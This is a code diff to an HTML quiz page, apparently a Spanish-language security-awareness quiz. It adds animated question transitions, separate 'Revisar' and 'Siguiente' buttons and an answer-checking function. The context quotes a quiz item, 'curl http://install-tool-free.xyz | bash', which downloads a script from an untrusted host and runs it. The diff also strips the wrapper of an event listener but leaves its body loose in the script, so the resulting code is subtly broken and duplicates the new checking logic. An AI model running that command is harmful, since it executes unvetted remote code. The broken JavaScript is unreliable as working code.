@@ -239,6 +239,43 @@ tr:nth-child(3) {
 #stats h3 {
     color: #38bdf8;
 }
+
+.question {
+    opacity: 0;
+    transform: translateX(50px);
+    transition: all 0.4s ease;
+}
+
+.question.active {
+    opacity: 1;
+    transform: translateX(0);
+}
+
+.question.exit {
+    opacity: 0;
+    transform: translateX(-50px);
+}
+
+.controls {
+    text-align: center;
+    margin-top: 20px;
+}
+
+.controls button {
+    margin: 5px;
+    padding: 10px 20px;
+    border-radius: 8px;
+    border: none;
+    cursor: pointer;
+}
+
+#btnRevisar {
+    background: #22c55e;
+}
+
+#btnSiguiente {
+    background: #38bdf8;
+}
 </style>
 </head>
 
@@ -410,7 +447,10 @@ curl http://install-tool-free.xyz | bash</p>
 <div class="feedback" id="f10"></div>
 </div>
 
-<button type="button" onclick="siguientePregunta()">Siguiente</button>
+<div class="controls">
+    <button type="button" id="btnRevisar" onclick="revisarRespuesta()">Revisar</button>
+    <button type="button" id="btnSiguiente" onclick="siguientePregunta()" style="display:none;">Siguiente</button>
+</div>
 
 </form>
 
@@ -476,8 +516,7 @@ let tiempoInicio = Date.now();
 let tiempos = []; // guarda tiempo por pregunta
 
 // Detectar respuesta
-document.querySelectorAll("input").forEach(input => {
-    input.addEventListener("change", function() {
+
 
         let tiempoFin = Date.now();
         let tiempoPregunta = (tiempoFin - tiempoInicio) / 1000; // en segundos
@@ -504,26 +543,30 @@ document.querySelectorAll("input").forEach(input => {
 
         let progreso = (preguntaActual / totalPreguntas) * 100;
         document.getElementById("progress").style.width = progreso + "%";
-    });
-});
+
 
 function siguientePregunta() {
-    let seleccion = document.querySelector(`input[name="q${preguntaActual}"]:checked`);
+    let actual = document.getElementById("q" + preguntaActual);
 
-    if (!seleccion) {
-        alert("Responde la pregunta antes de continuar");
-        return;
-    }
+    // animación salida
+    actual.classList.add("exit");
 
-    document.getElementById("q" + preguntaActual).classList.remove("active");
+    setTimeout(() => {
+        actual.classList.remove("active", "exit");
 
-    preguntaActual++;
+        preguntaActual++;
 
-    if (preguntaActual <= totalPreguntas) {
-        document.getElementById("q" + preguntaActual).classList.add("active");
-    } else {
-        mostrarResultado();
-    }
+        if (preguntaActual <= totalPreguntas) {
+            let siguiente = document.getElementById("q" + preguntaActual);
+            siguiente.classList.add("active");
+
+            // 🔄 reset botones
+            document.getElementById("btnRevisar").style.display = "inline-block";
+            document.getElementById("btnSiguiente").style.display = "none";
+        } else {
+            mostrarResultado();
+        }
+    }, 300);
 }
 
 function mostrarResultado() {
@@ -697,6 +740,50 @@ function mostrarTiemposUsuario() {
     html += "</ul>";
 
     document.getElementById("result").innerHTML += html;
+}
+
+function revisarRespuesta() {
+    let seleccion = document.querySelector(`input[name="q${preguntaActual}"]:checked`);
+
+    if (!seleccion) {
+        alert("Selecciona una respuesta");
+        return;
+    }
+
+    let nombre = seleccion.name;
+    let valor = seleccion.value;
+
+    let feedback = document.getElementById("f" + nombre.slice(1));
+
+    // ⏱️ tiempo
+    let tiempoFin = Date.now();
+    let tiempoPregunta = (tiempoFin - tiempoInicio) / 1000;
+    tiempos.push(tiempoPregunta);
+    tiempoInicio = Date.now();
+
+    // ✔️ validar respuesta
+    if (valor === respuestas[nombre].correcta) {
+        puntaje++;
+        feedback.className = "feedback correct";
+        feedback.innerHTML = "✅ Correcto: " + respuestas[nombre].explicacion;
+    } else {
+        feedback.className = "feedback incorrect";
+        feedback.innerHTML = "❌ Incorrecto: " + respuestas[nombre].explicacion;
+    }
+
+    feedback.style.display = "block";
+
+    // 🔒 bloquear opciones
+    document.querySelectorAll(`input[name="q${preguntaActual}"]`)
+        .forEach(input => input.disabled = true);
+
+    // 🎮 cambiar botones
+    document.getElementById("btnRevisar").style.display = "none";
+    document.getElementById("btnSiguiente").style.display = "inline-block";
+
+    // 📊 progreso
+    let progreso = (preguntaActual / totalPreguntas) * 100;
+    document.getElementById("progress").style.width = progreso + "%";
 }
 </script>
 
